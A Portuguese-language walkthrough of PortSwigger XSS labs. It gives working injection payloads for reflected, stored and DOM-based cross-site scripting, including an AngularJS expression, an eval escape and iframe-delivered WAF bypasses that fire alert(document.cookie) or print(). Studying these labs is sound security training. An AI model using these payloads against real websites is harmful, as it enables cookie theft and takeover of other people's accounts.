---
title: "PortSwigger - XSS"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de XSS da PortSwigger"
keywords: ["PortSwigger", "XSS", "Cross-Site Scripting", "Web Security"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: Reflected XSS into HTML context with nothing encoded
"This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
To solve the lab, perform a cross-site scripting attack that calls the alert function. "

A funcionalidade de busca mostra o input do usuário na tela. 
Essa busca é refletida na URL, então se injetarmos a URL com o parâmetro:
```
/?search=<script>alert()</script>
```
Resolvemos o desafio.

## Lab: Stored XSS into HTML context with nothing encoded
"This lab contains a stored cross-site scripting vulnerability in the comment functionality.
To solve this lab, submit a comment that calls the alert function when the blog post is viewed. "

Os comentários são apresentados para o usuário sem nenhum filtro, portanto podemos submeter o seguinte comentário:
```
<script>alert()</script>
```

## Lab: DOM XSS in document.write sink using source location.search
"This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.
To solve this lab, perform a cross-site scripting attack that calls the alert function. "

Observando o código fonte da página, vemos que o seguinte script para mostrar o input do usuário na barra de busca:
```JS
function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	trackSearch(query);
}
```
Observamos a sink `<img src="/resources/images/tracker.gif?searchTerms='++query'">'"`. Podemos burlar as marcações de aspas injetando no input de busca:
```HTML
anything'">// <script>alert()</script>
```

## Lab: DOM XSS in innerHTML sink using source location.search
"This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.
To solve this lab, perform a cross-site scripting attack that calls the alert function. "

Inspecionando o código fonte, descobrimos uma "sink" de `innerHTML`:
```HTML
<script>
function doSearchQuery(query) {
	document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	doSearchQuery(query);
}
</script>
```
Nesse, caso podemos usar o payload com tag de `img`, 
```HTML
<img src=1 onerror=alert(document.domain)>
```

## Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
"This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.
To solve this lab, make the "back" link alert document.cookie. "

Inspecionando o código fonte, observamos que o valor na url `returnPath` é passado para uma função do JQuery `attr`:
```html
 <script>
$(function() {
	$('#backLink').attr("href", (new 
	URLSearchParams(window.location.search)).get('returnPath'));
});
</script> 
```
Submetemos a URL com o alerta requisitado no lab:
```
/feedback?returnPath=javascript:alert(document.cookie)
```

## Lab: DOM XSS in jQuery selector sink using a hashchange event
" This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.
To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. "

No código fonte da página podemos observar um listener que detecta se o hash foi mudado. Caso tenha sido mudado, tenta realizar um scroll para o local. 
Nesse caso, a vulnerabilidade pode ser acionada após a primeira interação com a página. Assim devemos servir o seguinte payload para o usuário em um host malicioso: 
```HTML
<iframe src="https://0abf009c045db892800903b300a80088.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'">
```

## Lab: Reflected XSS into attribute with angle brackets HTML-encoded
"This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function."

Como `<>` é codificado, devemos criar outro contexto de script executável javascript para injetar o payload XSS:
```
" autofocus onfocus=alert() x="
```

## Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
"This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked."

Observamos que no nome do usuário, o campo Website, submetido ao realizar o comentário, é colocado no parâmetro `href`. No `href` podemos executar javascript com `javascript:...`. Portanto, o payload é:
```HTML
javascript:alert(1)
```
No campo Website.

## Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
"This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. "

Observamos o seguinte script que processa o input
```HTML
<script>
...
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
Utilizamos o payload: 
```HTML
';alert(1)//
```

## Lab: DOM XSS in document.write sink using source location.search inside a select element
"This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.
To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. "

Inspecionando o código fonte de um produto, vemos o parâmetro que podemos explorar:
```
/product?productId=1&storeId=Paris
```
storeId é utilizado em document.write. Com isso, com o seguinte payload conseguimos emitir um alert:
```
/product?productId=1&storeId=<script>alert(1)</script>
```

## Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
"This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.
AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.
To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function. "

Com a execução por meio do Angular, podemos injetar o payload na barra de busca:
```
{\{constructor.constructor('alert(1)')()\}}
```

## Lab: Reflected DOM XSS
"This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
To solve this lab, create an injection that calls the `alert()` function."

Primeiramente, a requisição é feita para o servidor com o valor submetido no campo da busca.
O servidor realiza escaping das quotes("). com `\\`. 
Injetando: `\"` há erro no código do lado do cliente. Sempre realiza o preppend.
```
eval('var searchResultsObj = ' + this.responseText);
```
Quando haverá execução de JS?
- eval
O input do usuário entrará num json:
```
eval('{"results":[],"searchTerm":""}')
```

```
"searchTerm":""}`
```
```
eval('var searchResultsObj =  {"result":[],"searchTerm":""}');
```
A parte de mostrar na tela do usuário:
```JS
var h1 = document.createElement("h1");
h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
```
`searchTerm` é o input do usuário na busca. Mas, .innerText é seguro. Portanto resta tentar explorar o eval.
`\` Não é lidado corretamente pelo backend(escaped). Portanto, podemos usar o payload:
```
\"};alert(1);//
```

## Lab: Stored DOM XSS
"This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function. "
Utiliza o `innerHTML`, arriscado. Porém, realiza escapeHTML.
```JS
function escapeHTML(html) {
	return html.replace('<', '&lt;').replace('>', '&gt;');
}
```
A função replace apenas substitui a primeira ocorrência do padrão. Portanto podemos explorar este fato com o payload:
```
<<img src=1 onerror='alert(1)'>>
```

## Lab: Reflected XSS into HTML context with most tags and attributes blocked
"This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function. "
ffuf de tags html:
```
h2
discard
h3
h4                      
h5
h6
portal
body
search 
```
ffuf de eventos:
```
onresize
```
Estado atual:
```
<body onresize="print()">
```
Porém, não pode haver interação com usuário.
Assim, a ideia é colocar um iframe no site malicioso e modificar o tamanho do iframe, o que poderá acionar o evento onresize. 
Payload final:
```HTML
<iframe src="https://0a88005d038b195480260de6006b0021.web-security-academy.net/?search=<body+onresize='print()'>" width="200" height="200"></iframe>
<script>
  var f = document.querySelector("iframe");
  setTimeout(function() {
    f.width = 300;
  }, 1000);
</script>
```
Testando o payload em si mesmo, sem o timeout o `onresize` não era acionado.
os script do ffuf utilizaram as wordlists do SecLists `html-tags.txt` e `html-events.txt`. 

## Lab: Reflected XSS into HTML context with all tags blocked except custom ones
"This lab blocks all HTML tags except custom ones.
To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie. "
Atual:
vaza na tela: `//'`
```
'<some-tag+src=1+onerror=alert(document.cookie)></some-tag></h1>//
```
Consultamos custom tags no cheat sheet e econtramos esse:
```
<evil onmouseover=alert(1)>test</evil>
```
Para fazer com que o usuário inevitavelmente passe o mouse em cima da tag, podemos aumentar o seu tamanho:
```html
<evil onmouseover="alert(document.cookie)" style="display:block;position:fixed;top:0;left:0;width:100%;height:100%;background:transparent;z-index:9999">
test
</evil>
```
tornando o item invisível ao usuário e em cima de todo o resto.
Testando em si, o exploit parece ser bem sucedido. Porém, não é uma resposta aceita.
Devemos modificar o event handler para usar a lógica de onfocus:
```
search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```
O `#` foca automaticamente na tag de id x. Com o tabindex permitindo que o elemento seja focável.
Payload final no host malicioso:
```
<script>
location = 'https://0acb00c503e9cc72820fbaaa0032006d.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'
</script>
```
